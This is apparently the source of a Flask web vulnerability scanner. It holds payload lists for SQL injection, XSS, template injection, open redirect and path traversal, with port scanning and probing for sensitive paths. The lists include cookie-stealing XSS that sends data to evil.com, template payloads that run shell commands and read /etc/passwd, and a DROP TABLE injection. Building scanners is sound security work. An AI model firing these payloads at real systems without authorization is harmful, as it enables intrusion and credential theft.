import os
import sys
import json
import time
import socket
import ssl
import hashlib
import re
import threading
import queue
import urllib.parse
import urllib.request
import urllib.error
import html
import certifi
import dns.resolver
import concurrent.futures
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response, send_from_directory
from flask_cors import CORS
from werkzeug.utils import secure_filename

app = Flask(__name__, static_folder='static', template_folder='templates')
CORS(app)

# Store active scan jobs
active_scans = {}
scan_results = {}
scan_logs = {}

# ============================================================
# PAYLOADS DATABASE
# ============================================================

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,@@version,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
    "1' OR '1' = '1",
    "1' OR '1' = '1' --",
    "' OR '1' = '1' #",
    "' OR 'x'='x",
    "' OR 'x'='x' --",
    "' OR 'x'='x' #",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "1; DROP TABLE users--",
    "1; SELECT * FROM users--",
    "admin\"--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 4--",
    "1' ORDER BY 5--",
    "1' GROUP BY 1--",
    "1' GROUP BY 2--",
    "1' GROUP BY 3--",
    "' HAVING 1=1--",
    "' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(5000000,MD5(1))--",
    "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "%' OR '1'='1",
    "%' OR '1'='1' --",
    "%%' OR '1'='1' --",
    "' UNION SELECT @@version,@@servername--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<math><mtext><table><mglyph><svg><mtext><table><mglyph><svg><script>alert(1)</script>",
    "';alert(1);//",
    "\";alert(1);//",
    "');alert(1);//",
    "\");alert(1);//",
    "-alert(1)-",
    "'';!--\"<XSS>=&{()}",
    "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
    "<script>new Image().src='https://evil.com/steal?cookie='+document.cookie</script>",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
    "${7*7}",
    "${7*'7'}",
    "#{7*7}",
    "*{7*7}",
    "{{'a'.__class__.__mro__[1].__subclasses__()}}",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "//evil.com/test",
    "https://evil.com",
    "http://evil.com",
    "//evil.com%2ftest",
    "///evil.com",
    "//evil.com/",
    "/\\evil.com",
    "/%09/evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../../etc/shadow",
    "../../../windows/win.ini",
    "../../../../windows/win.ini",
    "../../../../../../windows/win.ini",
    "../../../../../../../../windows/win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..;/..;/../etc/passwd",
]

# ============================================================
# SCANNER ENGINE
# ============================================================

def add_log(scan_id, level, message, data=None):
    """Add a log entry to the scan"""
    if scan_id not in scan_logs:
        scan_logs[scan_id] = []
    
    entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'level': level,
        'message': message,
        'data': data or {}
    }
    scan_logs[scan_id].append(entry)
    
    # Keep only last 1000 logs
    if len(scan_logs[scan_id]) > 1000:
        scan_logs[scan_id] = scan_logs[scan_id][-1000:]
    
    return entry


def add_vulnerability(scan_id, vuln_type, severity, url, details, payload=None, evidence=None):
    """Add a vulnerability finding"""
    if scan_id not in scan_results:
        scan_results[scan_id] = {
            'vulnerabilities': [],
            'stats': {
                'total': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'info': 0
            }
        }
    
    vuln = {
        'id': hashlib.md5(f"{vuln_type}{url}{datetime.now().timestamp()}".encode()).hexdigest()[:8],
        'type': vuln_type,
        'severity': severity,
        'url': url,
        'details': details,
        'payload': payload,
        'evidence': evidence,
        'timestamp': datetime.now().strftime('%H:%M:%S')
    }
    
    scan_results[scan_id]['vulnerabilities'].append(vuln)
    scan_results[scan_id]['stats']['total'] += 1
    scan_results[scan_id]['stats'][severity.lower()] += 1
    
    add_log(scan_id, severity.upper(), f"[{severity}] {vuln_type} found at {url}", vuln)
    
    return vuln


def is_alive(url, timeout=5):
    """Check if a URL is reachable"""
    try:
        req = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (SecurityScanner/1.0)'}
        )
        response = urllib.request.urlopen(req, timeout=timeout)
        return response
    except Exception as e:
        return None


def get_page_content(url, params=None, timeout=8):
    """Fetch page content"""
    try:
        if params:
            full_url = url + '?' + urllib.parse.urlencode(params)
        else:
            full_url = url
        
        req = urllib.request.Request(
            full_url,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
        )
        response = urllib.request.urlopen(req, timeout=timeout)
        content = response.read().decode('utf-8', errors='ignore')
        return content, response.headers, response.getcode()
    except Exception as e:
        return None, None, None


def test_sql_injection(scan_id, target_url, stop_flag):
    """Test for SQL Injection vulnerabilities"""
    add_log(scan_id, 'INFO', f"Starting SQL Injection scan on {target_url}")
    
    # Find parameters in URL
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    # If no params, try form-based injection
    if not params:
        add_log(scan_id, 'INFO', "No URL parameters found, trying form-based injection")
        content, headers, code = get_page_content(target_url)
        if content:
            # Find forms
            form_pattern = re.compile(r'<form[^>]*action=["\']?([^"\'\s>]+)["\']?[^>]*>', re.IGNORECASE)
            input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
            
            forms = form_pattern.findall(content)
            inputs = input_pattern.findall(content)
            
            for form_action in forms:
                for inp in inputs:
                    for payload in SQLI_PAYLOADS[:10]:  # Test first 10
                        if stop_flag and stop_flag.is_set():
                            return
                        
                        test_url = urllib.parse.urljoin(target_url, form_action) if form_action else target_url
                        test_data = {inp: payload}
                        test_data_str = urllib.parse.urlencode(test_data)
                        
                        try:
                            req = urllib.request.Request(
                                test_url,
                                data=test_data_str.encode(),
                                headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
                            )
                            response = urllib.request.urlopen(req, timeout=5)
                            resp_body = response.read().decode('utf-8', errors='ignore')
                            
                            # Check for SQL errors or successful injection
                            error_patterns = [
                                r'You have an error in your SQL syntax',
                                r'Warning: mysql',
                                r'Warning: mysqli',
                                r'Warning: SQLite',
                                r'Warning: PostgreSQL',
                                r'ODBC SQL Server Driver',
                                r'Unclosed quotation mark',
                                r'Microsoft OLE DB',
                                r'SQLite/JDBCDriver',
                                r'sqlite3\.OperationalError',
                                r'PSQLException',
                                r'com\.mysql\.jdbc',
                                r'org\.postgresql',
                                r'ORA-[0-9]{5}',
                                r'SQLSTATE',
                                r'MariaDB server',
                                r'division by zero',
                            ]
                            
                            for pattern in error_patterns:
                                if re.search(pattern, resp_body, re.IGNORECASE):
                                    add_vulnerability(
                                        scan_id, 'SQL Injection', 'CRITICAL',
                                        test_url,
                                        f"SQL injection vulnerability detected with parameter '{inp}'",
                                        payload,
                                        resp_body[:500]
                                    )
                                    break
                        except urllib.error.HTTPError as e:
                            if e.code == 500:
                                body = e.read().decode('utf-8', errors='ignore')
                                for pattern in [
                                    r'You have an error in your SQL syntax',
                                    r'Warning: mysql',
                                    r'ORA-[0-9]{5}',
                                    r'SQLSTATE'
                                ]:
                                    if re.search(pattern, body, re.IGNORECASE):
                                        add_vulnerability(
                                            scan_id, 'SQL Injection', 'CRITICAL',
                                            test_url,
                                            f"SQL error revealed in HTTP 500 response with parameter '{inp}'",
                                            payload,
                                            body[:500]
                                        )
                                        break
                        except:
                            pass
    
    # Test URL parameters
    for param in params:
        original_value = params[param][0]
        for payload in SQLI_PAYLOADS:
            if stop_flag and stop_flag.is_set():
                return
            
            test_params = params.copy()
            test_params[param] = [payload]
            
            content, headers, code = get_page_content(target_url, dict(test_params))
            if content:
                # Check for SQL errors
                error_patterns = [
                    r'You have an error in your SQL syntax',
                    r'Warning: mysql',
                    r'Warning: mysqli',
                    r'Warning: SQLite',
                    r'Warning: PostgreSQL',
                    r'ODBC SQL Server Driver',
                    r'Unclosed quotation mark',
                    r'Microsoft OLE DB',
                    r'SQLite/JDBCDriver',
                    r'PSQLException',
                    r'com\.mysql\.jdbc',
                    r'org\.postgresql',
                    r'ORA-[0-9]{5}',
                    r'SQLSTATE',
                    r'MariaDB server',
                    r'division by zero',
                    r'SQL command not properly ended',
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        add_vulnerability(
                            scan_id, 'SQL Injection', 'CRITICAL',
                            target_url,
                            f"SQL error revealed in parameter '{param}'",
                            payload,
                            content[:500]
                        )
                        break
    
    add_log(scan_id, 'INFO', "SQL Injection scan completed")


def test_xss(scan_id, target_url, stop_flag):
    """Test for XSS vulnerabilities"""
    add_log(scan_id, 'INFO', f"Starting XSS scan on {target_url}")
    
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        add_log(scan_id, 'INFO', "No URL parameters found for XSS testing")
        content, headers, code = get_page_content(target_url)
        if content:
            # Find forms and inputs
            input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
            inputs = input_pattern.findall(content)
            
            if inputs:
                add_log(scan_id, 'INFO', f"Found {len(inputs)} input fields to test for XSS")
                
                for inp in inputs[:5]:
                    for payload in XSS_PAYLOADS[:5]:  # Test first 5
                        if stop_flag and stop_flag.is_set():
                            return
                        
                        test_data = {inp: payload}
                        try:
                            req = urllib.request.Request(
                                target_url,
                                data=urllib.parse.urlencode(test_data).encode(),
                                headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
                            )
                            response = urllib.request.urlopen(req, timeout=5)
                            resp_body = response.read().decode('utf-8', errors='ignore')
                            
                            # Check if payload is reflected
                            reflected_payloads = [
                                "<script>alert(1)</script>",
                                "<script>alert('XSS')</script>",
                                "<img src=x onerror=alert(1)>",
                                "<svg/onload=alert(1)>",
                            ]
                            for rp in reflected_payloads:
                                if rp in resp_body:
                                    add_vulnerability(
                                        scan_id, 'XSS (Reflected)', 'HIGH',
                                        target_url,
                                        f"Reflected XSS via form input '{inp}'",
                                        rp,
                                        resp_body[resp_body.find(rp)-50:resp_body.find(rp)+len(rp)+50]
                                    )
                                    break
                        except:
                            pass
    
    # Test URL parameters
    for param in params:
        for payload in XSS_PAYLOADS[:10]:
            if stop_flag and stop_flag.is_set():
                return
            
            test_params = params.copy()
            test_params[param] = [payload]
            
            content, headers, code = get_page_content(target_url, dict(test_params))
            if content:
                # Check if payload is reflected in response
                simple_payloads = [
                    "<script>alert(1)</script>",
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>", 
                    "<svg/onload=alert(1)>",
                    "';alert(1);//",
                ]
                for sp in simple_payloads:
                    if sp in content:
                        add_vulnerability(
                            scan_id, 'XSS (Reflected)', 'HIGH',
                            target_url,
                            f"Reflected XSS found in parameter '{param}'",
                            sp,
                            content[content.find(sp)-50:content.find(sp)+len(sp)+50]
                        )
                        break
    
    add_log(scan_id, 'INFO', "XSS scan completed")


def test_ssti(scan_id, target_url, stop_flag):
    """Test for Server-Side Template Injection"""
    add_log(scan_id, 'INFO', f"Starting SSTI scan on {target_url}")
    
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    for param in params:
        for payload in SSTI_PAYLOADS[:8]:
            if stop_flag and stop_flag.is_set():
                return
            
            test_params = params.copy()
            test_params[param] = [payload]
            
            content, headers, code = get_page_content(target_url, dict(test_params))
            if content:
                # Check if 7*7 = 49 (Jinja2)
                if "{{7*7}}" in payload and "49" in content:
                    add_vulnerability(
                        scan_id, 'SSTI (Server-Side Template Injection)', 'CRITICAL',
                        target_url,
                        f"SSTI detected via parameter '{param}' - Jinja2/Twig template engine",
                        payload,
                        content[:300]
                    )
                # Check if ${7*7} works
                if "${7*7}" in payload and ("7*7" in content or "49" in content):
                    add_vulnerability(
                        scan_id, 'SSTI (Server-Side Template Injection)', 'CRITICAL',
                        target_url,
                        f"SSTI detected via parameter '{param}' - Freemarker/Java template engine",
                        payload,
                        content[:300]
                    )
    
    add_log(scan_id, 'INFO', "SSTI scan completed")


def test_open_redirect(scan_id, target_url, stop_flag):
    """Test for Open Redirect vulnerabilities"""
    add_log(scan_id, 'INFO', f"Starting Open Redirect scan on {target_url}")
    
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    # Common redirect parameter names
    redirect_params = ['url', 'redirect', 'redirect_uri', 'redirect_url', 'next', 
                        'return', 'return_to', 'return_url', 'target', 'goto',
                        'link', 'page', 'load', 'view', 'site', 'dir', 'ref',
                        'dest', 'destination', 'out', 'to', 'uri', 'path', 'continue']
    
    for param in params:
        if param.lower() in redirect_params:
            for payload in OPEN_REDIRECT_PAYLOADS:
                if stop_flag and stop_flag.is_set():
                    return
                
                test_params = params.copy()
                test_params[param] = [payload]
                
                try:
                    test_url = target_url + '?' + urllib.parse.urlencode(dict(test_params))
                    req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urllib.request.urlopen(req, timeout=5)
                    
                    # Check if redirected to external site
                    if response.geturl() != test_url and 'evil' in response.geturl():
                        add_vulnerability(
                            scan_id, 'Open Redirect', 'MEDIUM',
                            target_url,
                            f"Open redirect via parameter '{param}' - redirects to {response.geturl()}",
                            payload,
                            f"Redirected to: {response.geturl()}"
                        )
                except urllib.error.HTTPError as e:
                    # Some redirects return 302
                    pass
                except:
                    pass
    
    add_log(scan_id, 'INFO', "Open Redirect scan completed")


def test_path_traversal(scan_id, target_url, stop_flag):
    """Test for Path Traversal / LFI vulnerabilities"""
    add_log(scan_id, 'INFO', f"Starting Path Traversal scan on {target_url}")
    
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    # Check URL parameters that might be file paths
    file_params = ['file', 'page', 'doc', 'view', 'include', 'template', 
                    'load', 'read', 'path', 'dir', 'folder', 'root', 'site']
    
    for param in params:
        if param.lower() in file_params:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                if stop_flag and stop_flag.is_set():
                    return
                
                test_params = params.copy()
                test_params[param] = [payload]
                
                content, headers, code = get_page_content(target_url, dict(test_params))
                if content:
                    # Check for successful path traversal indicators
                    indicators = [
                        'root:x:', 'bin:x:', 'daemon:x:', 'nobody:x:',  # /etc/passwd
                        'root:$', 'root:*:',                            # /etc/shadow
                        '[fonts]', '[extensions]',                     # win.ini
                        'Microsoft', 'Windows', 'System32',            # windows
                        '<?php', '<?=',                                 # PHP files
                        'namespace ', 'use ',                           # PHP classes
                    ]
                    
                    for indicator in indicators:
                        if indicator in content:
                            add_vulnerability(
                                scan_id, 'Path Traversal / LFI', 'HIGH',
                                target_url,
                                f"Path traversal via parameter '{param}' - file content readable",
                                payload,
                                content[:500]
                            )
                            break
    
    add_log(scan_id, 'INFO', "Path Traversal scan completed")


def test_security_headers(scan_id, target_url, stop_flag):
    """Check for missing security headers"""
    add_log(scan_id, 'INFO', f"Checking security headers on {target_url}")
    
    content, headers, code = get_page_content(target_url)
    if not headers:
        add_log(scan_id, 'WARN', "Could not retrieve headers")
        return
    
    # Check for missing security headers
    security_headers = {
        'Strict-Transport-Security': 'Missing HSTS header - allows protocol downgrade attacks',
        'Content-Security-Policy': 'Missing CSP header - vulnerable to XSS and data injection',
        'X-Content-Type-Options': 'Missing X-Content-Type-Options - vulnerable to MIME sniffing',
        'X-Frame-Options': 'Missing X-Frame-Options - vulnerable to clickjacking',
        'X-XSS-Protection': 'Missing XSS Protection header',
        'Referrer-Policy': 'Missing Referrer-Policy header - may leak URL parameters',
        'Permissions-Policy': 'Missing Permissions-Policy header - may allow unwanted API access',
    }
    
    for header, description in security_headers.items():
        if stop_flag and stop_flag.is_set():
            return
        if header not in headers:
            add_vulnerability(
                scan_id, 'Missing Security Header', 'LOW',
                target_url,
                description,
                None,
                f"Header '{header}' not found in response"
            )
    
    # Check if server info is exposed
    server_header = headers.get('Server')
    if server_header and server_header != '':
        add_vulnerability(
            scan_id, 'Information Disclosure', 'LOW',
            target_url,
            f"Server information disclosed: {server_header}",
            None,
            f"Server: {server_header}"
        )
    
    x_powered_by = headers.get('X-Powered-By')
    if x_powered_by:
        add_vulnerability(
            scan_id, 'Information Disclosure', 'LOW',
            target_url,
            f"Technology stack disclosed: {x_powered_by}",
            None,
            f"X-Powered-By: {x_powered_by}"
        )
    
    add_log(scan_id, 'INFO', "Security headers check completed")


def test_cors(scan_id, target_url, stop_flag):
    """Test for CORS misconfiguration"""
    add_log(scan_id, 'INFO', f"Testing CORS configuration on {target_url}")
    
    try:
        req = urllib.request.Request(
            target_url,
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Origin': 'https://evil.com',
            }
        )
        response = urllib.request.urlopen(req, timeout=5)
        cors_origin = response.headers.get('Access-Control-Allow-Origin')
        cors_credentials = response.headers.get('Access-Control-Allow-Credentials')
        
        if cors_origin == '*' or cors_origin == 'https://evil.com':
            severity = 'HIGH' if cors_origin == '*' and cors_credentials == 'true' else 'MEDIUM'
            add_vulnerability(
                scan_id, 'CORS Misconfiguration', severity,
                target_url,
                f"CORS allows origin '{cors_origin}' with credentials='{cors_credentials}'",
                None,
                f"ACAO: {cors_origin}, ACAC: {cors_credentials}"
            )
        elif cors_origin:
            add_log(scan_id, 'INFO', f"CORS configured - allowed origin: {cors_origin}")
        else:
            add_log(scan_id, 'INFO', "No CORS headers found")
    except:
        add_log(scan_id, 'WARN', "Could not test CORS")
    
    add_log(scan_id, 'INFO', "CORS check completed")


def port_scan(scan_id, target_url, stop_flag):
    """Scan common ports on the target"""
    add_log(scan_id, 'INFO', f"Starting port scan")
    
    parsed = urllib.parse.urlparse(target_url)
    hostname = parsed.hostname
    
    if not hostname:
        add_log(scan_id, 'WARN', "Could not resolve hostname")
        return
    
    # Resolve hostname
    try:
        ip = socket.gethostbyname(hostname)
        add_log(scan_id, 'INFO', f"Resolved {hostname} -> {ip}")
    except:
        add_log(scan_id, 'ERROR', f"Could not resolve {hostname}")
        return
    
    # Common ports to scan
    ports = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        110: 'POP3',
        111: 'RPC',
        135: 'RPC',
        139: 'NetBIOS',
        143: 'IMAP',
        443: 'HTTPS',
        445: 'SMB',
        993: 'IMAPS',
        995: 'POP3S',
        1433: 'MSSQL',
        1521: 'Oracle',
        2049: 'NFS',
        2082: 'cPanel',
        2083: 'cPanel SSL',
        3306: 'MySQL',
        3389: 'RDP',
        5432: 'PostgreSQL',
        5900: 'VNC',
        5985: 'WinRM',
        5986: 'WinRM SSL',
        6379: 'Redis',
        8080: 'HTTP-Alt',
        8443: 'HTTPS-Alt',
        9000: 'PHP-FPM',
        9090: 'WebLogic',
        27017: 'MongoDB',
    }
    
    open_ports = []
    
    for port, service in ports.items():
        if stop_flag and stop_flag.is_set():
            return
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                open_ports.append({'port': port, 'service': service})
                try:
                    # Try to grab banner
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    sock.send(b'GET / HTTP/1.0\r\n\r\n')
                    banner = sock.recv(256).decode('utf-8', errors='ignore').strip()[:100]
                    sock.close()
                except:
                    banner = ''
                
                severity = 'HIGH' if port in [21, 23, 135, 445, 3389, 5900] else 'MEDIUM'
                add_vulnerability(
                    scan_id, 'Open Port', severity,
                    target_url,
                    f"Open port: {port}/{service}",
                    None,
                    f"Port {port} ({service}) is open on {ip}" + (f"\nBanner: {banner}" if banner else "")
                )
        except:
            pass
    
    add_log(scan_id, 'INFO', f"Port scan completed - found {len(open_ports)} open ports")


def check_ssl_tls(scan_id, target_url, stop_flag):
    """Check SSL/TLS configuration"""
    add_log(scan_id, 'INFO', "Checking SSL/TLS configuration")
    
    parsed = urllib.parse.urlparse(target_url)
    hostname = parsed.hostname
    
    if parsed.scheme != 'https':
        add_log(scan_id, 'INFO', "Target is not HTTPS, skipping SSL check")
        return
    
    if not hostname:
        return
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((hostname, 443))
        
        ssock = context.wrap_socket(sock, server_hostname=hostname)
        cert = ssock.getpeercert()
        cipher = ssock.cipher()
        version = ssock.version()
        
        ssock.close()
        
        # Check certificate info
        if cert:
            # Check if cert is self-signed
            issuer = dict(cert['issuer'][0])
            subject = dict(cert['subject'][0])
            if issuer == subject:
                add_vulnerability(
                    scan_id, 'SSL/TLS - Self-Signed Certificate', 'MEDIUM',
                    target_url,
                    "SSL certificate is self-signed",
                    None,
                    f"Issuer: {issuer}\nSubject: {subject}"
                )
        
        # Check protocol version
        if version in ['TLSv1', 'TLSv1.1']:
            add_vulnerability(
                scan_id, 'SSL/TLS - Weak Protocol', 'HIGH',
                target_url,
                f"Uses outdated protocol: {version}",
                None,
                f"Protocol: {version}, Cipher: {cipher}"
            )
        
        add_log(scan_id, 'INFO', f"SSL/TLS: {version} - {cipher[0]}")
        
    except Exception as e:
        add_log(scan_id, 'WARN', f"SSL/TLS check failed: {str(e)}")
    
    add_log(scan_id, 'INFO', "SSL/TLS check completed")


def check_directory_enum(scan_id, target_url, stop_flag):
    """Enumerate common directories and files"""
    add_log(scan_id, 'INFO', "Starting directory/file enumeration")
    
    common_paths = [
        '/admin', '/login', '/wp-admin', '/administrator', '/backup',
        '/config', '/config.php', '/.env', '/.git/config', '/robots.txt',
        '/sitemap.xml', '/crossdomain.xml', '/phpinfo.php', '/info.php',
        '/test.php', '/dump.sql', '/backup.sql', '/db.sql', '/database.sql',
        '/.htaccess', '/.htpasswd', '/wp-config.php', '/wp-content',
        '/uploads', '/images', '/css', '/js', '/api', '/api/v1',
        '/api/users', '/swagger.json', '/api-docs', '/docs',
        '/server-status', '/cgi-bin', '/cgi-bin/test.cgi',
        '/console', '/actuator', '/swagger-ui', '/graphql',
        '/api/graphql', '/health', '/healthcheck', '/metrics',
        '/vendor', '/node_modules', '/package.json',
        '/web.config', '/Dockerfile', '/docker-compose.yml',
        '/README.md', '/.gitignore', '/composer.json',
        '/Gemfile', '/requirements.txt', '/Pipfile',
        '/index.php?page=../../../../etc/passwd',
        '/shell.php', '/cmd.php', '/upload.php',
        '/.aws/credentials', '/.azure/credentials',
    ]
    
    base_url = target_url.rstrip('/')
    found_paths = []
    
    for path in common_paths:
        if stop_flag and stop_flag.is_set():
            return
        
        test_url = base_url + path
        try:
            req = urllib.request.Request(
                test_url,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            response = urllib.request.urlopen(req, timeout=3)
            code = response.getcode()
            
            if code and code < 400:
                found_paths.append({'path': path, 'code': code})
                
                # Categorize severity
                if any(x in path for x in ['.env', '.git', 'config', 'backup', 'dump', 'sql', 'htpasswd', 'aws']):
                    severity = 'HIGH'
                elif any(x in path for x in ['admin', 'wp-admin', 'administrator', 'phpinfo', 'test.php', 'shell']):
                    severity = 'HIGH'
                elif any(x in path for x in ['api', 'graphql', 'swagger', 'actuator', 'metrics']):
                    severity = 'MEDIUM'
                elif code == 401 or code == 403:
                    severity = 'MEDIUM'
                else:
                    severity = 'LOW'
                
                content = response.read().decode('utf-8', errors='ignore')[:200]
                
                add_vulnerability(
                    scan_id, 'Exposed Path/Directory', severity,
                    test_url,
                    f"Accessible path: {path} (HTTP {code})",
                    None,
                    f"URL: {test_url}\nStatus: {code}\nPreview: {content[:200]}"
                )
        except urllib.error.HTTPError as e:
            if e.code == 401 or e.code == 403:
                add_vulnerability(
                    scan_id, 'Exposed Path/Directory (Restricted)', 'MEDIUM',
                    test_url,
                    f"Path exists but access restricted: {path} (HTTP {e.code})",
                    None,
                    f"URL: {test_url}\nStatus: {e.code}"
                )
            elif e.code == 301 or e.code == 302:
                # Redirect - might be interesting
                location = e.headers.get('Location', '')
                if location and 'admin' in location.lower():
                    add_vulnerability(
                        scan_id, 'Interesting Redirect', 'LOW',
                        test_url,
                        f"Redirect to: {location}",
                        None,
                        f"URL: {test_url}\n-> {location}"
                    )
            pass
        except:
            pass
    
    add_log(scan_id, 'INFO', f"Directory enumeration completed - found {len(found_paths)} paths")


def check_tech_info(scan_id, target_url, stop_flag):
    """Check for technologies in use"""
    add_log(scan_id, 'INFO', "Fingerprinting technology stack")
    
    content, headers, code = get_page_content(target_url)
    if not content:
        return
    
    tech_indicators = {
        'WordPress': [r'wp-content', r'wp-includes', r'wp-json', r'/wp-admin'],
        'Joomla': [r'com_content', r'/components/', r'/modules/', r'/templates/'],
        'Drupal': [r'Drupal.settings', r'drupal.js', r'/sites/default'],
        'Laravel': [r'Laravel', r'csrf-token', r'_token'],
        'Django': [r'csrftoken', r'django', r'__admin'],
        'jQuery': [r'jquery', r'jQuery'],
        'React': [r'react', r'react-dom', r'__NEXT_DATA__'],
        'Vue.js': [r'vue.js', r'__vue__', r'v-bind', r'v-for'],
        'Angular': [r'ng-app', r'angular', r'ng-controller'],
        'Bootstrap': [r'bootstrap', r'col-md', r'container-fluid'],
        'Apache': [r'Apache'],
        'Nginx': [r'nginx'],
        'Cloudflare': [r'cloudflare', r'__cfduid', r'cf-ray'],
        'Google Analytics': [r'gtag', r'ga.js', r'analytics.js'],
        'PHP': [r'\.php', r'PHP'],
        'ASP.NET': [r'__VIEWSTATE', r'__EVENTVALIDATION', r'ASP.NET'],
        'Node.js': [r'express', r'node.js', r'koa'],
    }
    
    found_techs = []
    
    for tech, patterns in tech_indicators.items():
        if stop_flag and stop_flag.is_set():
            return
        for pattern in patterns:
            if re.search(pattern, content, re.IGNORECASE):
                found_techs.append(tech)
                break
    
    # Also check headers
    server = headers.get('Server', '')
    x_powered = headers.get('X-Powered-By', '')
    
    if server:
        found_techs.append(f"Server: {server}")
    if x_powered:
        found_techs.append(f"X-Powered-By: {x_powered}")
    
    if found_techs:
        add_log(scan_id, 'INFO', f"Technologies detected: {', '.join(set(found_techs))}")
        add_vulnerability(
            scan_id, 'Technology Fingerprinting', 'INFO',
            target_url,
            f"Detected technologies: {', '.join(set(found_techs))}",
            None,
            f"Technologies: {', '.join(set(found_techs))}"
        )
    
    add_log(scan_id, 'INFO', "Technology fingerprinting completed")


def check_clickjacking(scan_id, target_url, stop_flag):
    """Test for clickjacking vulnerability"""
    add_log(scan_id, 'INFO', "Testing for clickjacking")
    
    try:
        # Create a frame-busting test
        test_html = f"""
        <html>
        <body>
        <iframe src="{target_url}" width="500" height="500" id="testframe"></iframe>
        <script>
        try {{
            var frame = document.getElementById('testframe');
            console.log('Frame loaded - potentially vulnerable to clickjacking');
        }} catch(e) {{
            console.log('Frame busting detected');
        }}
        </script>
        </body>
        </html>
        """
        
        content, headers, code = get_page_content(target_url)
        if headers:
            xfo = headers.get('X-Frame-Options', '').upper()
            csp = headers.get('Content-Security-Policy', '')
            
            if not xfo and 'frame-ancestors' not in csp:
                add_vulnerability(
                    scan_id, 'Clickjacking', 'MEDIUM',
                    target_url,
                    "Page can be embedded in iframe - vulnerable to clickjacking",
                    None,
                    "No X-Frame-Options or CSP frame-ancestors directive found"
                )
            elif xfo:
                add_log(scan_id, 'INFO', f"X-Frame-Options: {xfo}")
    except:
        pass
    
